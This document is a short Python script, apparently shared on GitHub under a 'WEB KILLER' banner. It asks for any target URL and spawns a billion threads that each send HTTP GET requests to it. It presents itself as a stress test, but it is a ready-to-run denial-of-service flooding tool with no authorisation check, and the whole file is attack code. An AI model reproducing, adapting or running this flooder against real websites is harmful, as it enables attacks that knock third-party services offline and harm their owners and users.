# Github --> MuhammedTarikInci

import requests
import threading

def print_ascii_header():
    ascii_art = """
     █     █░▓█████  ▄▄▄▄       ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄     ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██   ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀     ▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓   ▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░    ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
  ░   ░     ░    ░    ░    ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ 
    ░       ░  ░ ░         ░  ░    ░      ░  ░    ░  ░   ░  ░   ░     
                      ░                                               

----------------------------------------------------------------------
                    Made by Tarik | Version > 0.1
    """
    print(ascii_art)


def send_request(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("[+] Successful! - Package sent")  
        else:
            print(f"[-] Error: Received unexpected status code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")


def stress_test(url, thread_count):
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()


    for thread in threads:
        thread.join()


if __name__ == "__main__":
    print_ascii_header()  
    target_url = input("Target URL: ")
    try:
        
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            print("Try Again...")
        else:
            
            stress_test(target_url, 1000000000)
    except Exception as e:
        print(f"Error: {e}")
